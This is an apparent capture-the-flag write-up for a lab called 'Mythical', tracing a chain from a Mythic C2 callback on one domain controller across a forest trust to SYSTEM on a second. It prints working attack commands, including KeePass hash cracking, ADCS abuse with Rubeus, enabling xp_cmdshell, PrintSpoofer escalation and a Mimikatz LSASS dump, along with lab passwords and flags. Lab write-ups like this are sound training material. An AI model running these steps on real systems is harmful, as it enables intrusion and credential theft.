The shape of it

Mythical starts in a different place from a normal web box: there is already a live Mythic Apollo callback as NT AUTHORITY\SYSTEM on DC01. The work is not initial access; it is turning that execution context into disciplined evidence. Mythic's task output matters, but so do its file objects: a download task returns an agent file UUID, and the actual bytes have to be fetched from the Mythic server.

The chain moves through three layers. First, recover operator and domain material from the US side: a KeePass database, a reusable domain-join entry, ADCS abuse, and an Administrator/SYSTEM shell. Second, pivot across the trust into MYTHICAL-EU, where a writable dev share exposes a .NET helper with LDAP credentials and an MSSQL path. Third, abuse SQL Server execution and SeImpersonatePrivilege on DC02, then use Mimikatz to read root's flag from LSASS memory.

Mythic Apollo callback 19 → DC01 SYSTEM └─ Mythic file history → it.kdbx └─ keepass2john / john → password 741852 └─ KeePass entry → domjoin / hKvhexY5BtAgtWAY └─ ADCS + Rubeus → US Administrator material └─ SYSTEM shell on MYTHICAL-US\DC01 DC01 → nltest /domain_trusts └─ outbound trust to MYTHICAL-EU.VL └─ \\dc02.mythical-eu.vl\dev → getusers.exe └─ .NET strings → svc_ldap / osaRXWkDf2y5SGh5 └─ svc_sql same password / integrated SQL context └─ MSSQL sysadmin → xp_cmdshell └─ PrintSpoofer → DC02 SYSTEM └─ Mimikatz sekurlsa → root flag in wdigest
01 · mythic evidence
01

Callback 19 and file objects

The active foothold was Mythic callback 19, an Apollo agent on DC01 running as SYSTEM. The first important correction was about Mythic downloads: the task result is not necessarily file content. It can be a file UUID that must be retrieved through Mythic's file API.

query {
  filemeta(where: {agent_file_id: {_eq: "ecd89cf2-9164-4191-92e8-0cdf70a484f3"}}) {
    agent_file_id
    filename_text
    complete
    chunks_received
    total_chunks
  }
}
agent_file_id ecd89cf2-9164-4191-92e8-0cdf70a484f3 filename flag.txt complete true MYTH{76cf35201cef0f28026e5bc18e9caa87}
Evidence rule

A Mythic task line that looks like a UUID is a pointer, not proof. Fetch the registered file, decode base64 metadata when needed, and verify the bytes.

02 · credential recovery
02

KeePass and ADCS

Mythic file history exposed it.kdbx. After fetching the database, keepass2john produced a hash and John cracked the master password as 741852. The KeePass entry of interest was domjoin, with password hKvhexY5BtAgtWAY.

keepass2john it.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt
pykeepass it.kdbx --password 741852
KeePass password 741852 entry domjoin password hKvhexY5BtAgtWAY

The US path then follows the intended ADCS route: enumerate templates, request a certificate for Administrator, convert it to PFX, and use Rubeus /getcredentials to recover Administrator material. That material was enough to launch or reuse a SYSTEM-level Mythic execution context on DC01.

03 · domain trust
03

From US to EU

On DC01, nltest /domain_trusts /all_trusts showed a direct outbound trust to MYTHICAL-EU.VL. The EU domain controller resolved as dc02.mythical-eu.vl, and the custom share \\dc02.mythical-eu.vl\dev was readable and writable from the DC01 context.

trust MYTHICAL-US → MYTHICAL-EU dc02 192.168.1.20 share \\dc02.mythical-eu.vl\dev files Autologon64.exe, getusers.exe

The getusers.exe binary was a .NET assembly. Pulling strings out of it revealed hardcoded LDAP credentials and the target LDAP path:

LDAP LDAP://dc02.mythical-eu.vl user svc_ldap password osaRXWkDf2y5SGh5

Those credentials enumerated the EU users, including svc_ldap, svc_sql, and root. The same password was reused for svc_sql, and integrated SQL access from the DC01 context landed as MYTHICAL-EU\svc_sql.

04 · mssql
04

SQL Server to command execution

DC02 exposed MSSQL on 1433. SQL authentication with the service password failed, but integrated authentication from the current context succeeded. The resulting principal was sysadmin, which made xp_cmdshell available after enabling the advanced option.

C:\Program Files\SqlCmd\sqlcmd.exe -S dc02.mythical-eu.vl -E -Q "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
C:\Program Files\SqlCmd\sqlcmd.exe -S dc02.mythical-eu.vl -E -Q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
SYSTEM_USER MYTHICAL-EU\svc_sql sysadmin 1 xp_cmdshell enabled

Commands launched by SQL ran as the SQL Server service account on DC02, with SeImpersonatePrivilege. That is the hinge for local SYSTEM.

05 · dc02 system
05

PrintSpoofer on DC02

A known-good PrintSpoofer_x64.exe was already present in the Apollo agent source tree. Uploading it to the EU dev share and executing it through xp_cmdshell produced SYSTEM commands on DC02.

upload PrintSpoofer_x64.exe \\dc02.mythical-eu.vl\dev\ps.exe
EXEC xp_cmdshell '\\dc02.mythical-eu.vl\dev\ps.exe -i -c "whoami /priv"';
[+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK whoami mythical-eu\dc02$

With DC02 SYSTEM confirmed, C:\Users\Administrator\Desktop\root.txt became readable. It was not the flag. It was the clue.

root.txt The flag is in memory (user "root").
06 · memory
06

The flag was a logon secret

The first instinct was to scan the root user's GUI process memory: explorer.exe, ctfmon.exe, RuntimeBroker.exe, SearchApp.exe, and friends. That produced a lot of memory noise and no reliable MYTH{...}. A public writeup confirmed the intended direction: use Mimikatz against LSASS and search the logon sessions.

\\dc02.mythical-eu.vl\dev\mk.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\dev\mkout.txt
Session : Interactive from 1 User Name : root Domain : MYTHICAL-EU Logon Server : DC02 wdigest : * Username : root * Domain : MYTHICAL-EU * Password : MYTH{5ce966ce482c67269934e0d01c169b20}

dead ends that paid rent
File UUID confusion. Treating the Mythic download response as file content made the first flag look wrong. The fix was querying filemeta and using the file UUID as a fetch handle.
SQL authentication. svc_sql did not work as a direct SQL login. Integrated auth from the compromised context did, and it was sysadmin.
Process dump scanning. Full GUI dumps and chunk scans were noisy. The clue said memory, but the intended memory was LSASS logon material.
08 · notes
08

Takeaways

01
C2 artifacts are evidence objects
A task result, a file UUID, file metadata, and downloaded bytes are different layers. Closing the loop means validating the final layer.
02
Trusts turn local admin into map reading
Once DC01 was SYSTEM, nltest, DNS, and shares quickly exposed the next domain's attack surface.
03
SQL context matters
The failed SQL password was not the end. The Windows token already had a route to an integrated, sysadmin SQL session.
04
Read the clue literally
"The flag is in memory" was not a call for blind process dumping. It was a hint that root had an interactive logon secret in LSASS.
